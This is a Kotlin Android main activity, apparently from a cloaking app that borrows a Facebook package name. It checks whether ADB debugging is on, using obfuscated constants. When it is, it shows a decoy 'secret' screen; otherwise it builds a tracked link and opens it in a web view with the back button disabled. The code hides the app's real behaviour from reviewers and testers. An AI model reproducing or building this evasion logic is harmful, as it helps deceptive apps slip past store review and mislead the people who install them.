package com.facebook.ta

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.lifecycle.lifecycleScope
import com.facebook.ta.data.CustomStorage
import com.facebook.ta.data.SuperChecker
import com.facebook.ta.databinding.ActivityMainBinding
import com.facebook.ta.services.MyService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.IOException
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    //loading
    private lateinit var binding: ActivityMainBinding
    private lateinit var customBroadcast: BroadcastReceiver
    private val customStorage = CustomStorage()
    private val requestPermission = registerForActivityResult(ActivityResultContracts.RequestPermission()){
        //ask trackers and build link
        addListenners()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val constants = Constants(this)

        customBroadcast = object : BroadcastReceiver(){
            override fun onReceive(context: Context?, intent: Intent?) {
                val devBrodcastResponse = intent?.getStringExtra(constants.getOneSignal(22, 22)) ?: "null"
                lifecycleScope.launch {
                    App.customDDbTransmitter.emit(devBrodcastResponse)
                }
            }
        }

        startDevServiceAndRegisterReciever(1, 2, constants)
    }

    override fun onStart() {
        super.onStart()

        val dataFromStorage = customStorage.readData(Constants.KEY_LINK)

        if (dataFromStorage == Constants.WARN){
            goToTheSecretActivity()
        } else {
            askPerm()
        }
    }

    private fun startDevServiceAndRegisterReciever(a: Int, b: Int, constants: Constants){
        val intentForService = Intent(this, MyService::class.java)
        startService(intentForService)

        val intentDevBroadcast = IntentFilter(constants.getOneSignal(23, 23))
        registerReceiver(customBroadcast, intentDevBroadcast)
    }

    private fun goToTheSecretActivity() {
        val intent = Intent(this, Main2Activity::class.java)
        lifecycleScope.launch {
            delay(1800)
            startActivity(intent)
        }
    }

    private fun addListenners(){
        val intentToTheW = Intent(this, CustomActivity::class.java)
        val intentToNoInet = Intent(this, NoInetActivity::class.java)
        val superChecker = SuperChecker(this)
        val link = customStorage.readData(Constants.KEY_LINK)


        Log.d("123123", "Link in addListenners is $link")

        lifecycleScope.launch {

            if (isInternetAvailable(this@MainActivity)){
                App.customDDbTransmitter.collect{
                    //check adb

                    if (it == "0" && link.startsWith("htt")){
                        //we have link
                        intentToTheW.putExtra(Constants.KEY_LINK, link)
                        startActivity(intentToTheW)

                    } else if(it == "0" && link == Constants.EMPTY){
                        //build link and go to the web
                        addMoreListenners()
                        superChecker.getData()

                    } else if(it == "1"){
                        goToTheSecretActivity()
                    }
                }
            } else {
                startActivity(intentToNoInet)
            }
        }
    }


    private fun addMoreListenners(){
        val intentToTheW = Intent(this, CustomActivity::class.java)

        lifecycleScope.launch {
            App.customLinkFlow.collect{
                if (it.startsWith("htt")){
                    intentToTheW.putExtra(Constants.KEY_LINK, it)
                    startActivity(intentToTheW)
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(customBroadcast)
    }

    override fun onBackPressed() {
        //off
    }

    fun isInternetAvailable(context: Context): Boolean {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork ?: return false
            val networkCapabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            return networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) || networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
        } else {
            val networkInfo = connectivityManager.activeNetworkInfo ?: return false
            return networkInfo.isConnected
        }
    }

    private fun askPerm(){
        val permission = android.Manifest.permission.POST_NOTIFICATIONS
        requestPermission.launch(permission)
    }

}